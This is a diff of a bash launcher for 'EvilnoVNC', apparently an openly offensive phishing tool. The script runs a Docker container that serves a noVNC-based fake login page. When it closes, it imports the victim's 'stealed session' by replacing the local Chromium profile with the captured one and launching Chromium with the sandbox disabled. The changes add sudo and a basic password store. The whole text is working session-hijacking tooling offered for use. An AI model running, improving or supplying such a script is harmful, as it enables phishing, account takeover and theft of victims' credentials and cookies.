@@ -36,7 +36,7 @@ WEBPAGE=$2
 if docker -v &> /dev/null ; then
 if ! (( $(ps -ef | grep -v grep | grep docker | wc -l) > 0 )) ; then
 sudo service docker start > /dev/null 2>&1 ; sleep 3 ; fi ; fi
-docker run -d --rm -p 5980:5980 -v "${PWD}/Downloads":"/home/user/Downloads" -e RESOLUTION=$RESOLUTION -e WEBPAGE=$WEBPAGE --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
+sudo docker run -d --rm -p 5980:5980 -v "${PWD}/Downloads":"/home/user/Downloads" -e RESOLUTION=$RESOLUTION -e WEBPAGE=$WEBPAGE --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
 printf "\n\e[1;33m[>] EvilnoVNC Server is running.." ; sleep 3
 printf "\n\e[1;34m[+] URL: http://localhost:5980" ; sleep 3
 printf "\n\e[1;31m[!] Press Ctrl+C at any time to close!" ; sleep 3
@@ -46,5 +46,5 @@ trap 'printf "\n\e[1;33m[>] Import stealed session to Chromium.." ; sleep 3
 docker stop evilnovnc > /dev/null 2>&1 &
 rm -Rf ~/.config/chromium/Default > /dev/null 2>&1 ; cp -R Downloads/Default ~/.config/chromium/ > /dev/null 2>&1
 printf "\n\e[1;32m[+] Done!\n\e[1;0m"
-/bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter &" > /dev/null 2>&1 &' SIGTERM EXIT
+/bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &" > /dev/null 2>&1 &' SIGTERM EXIT
 while true ; do sleep 30 ; done
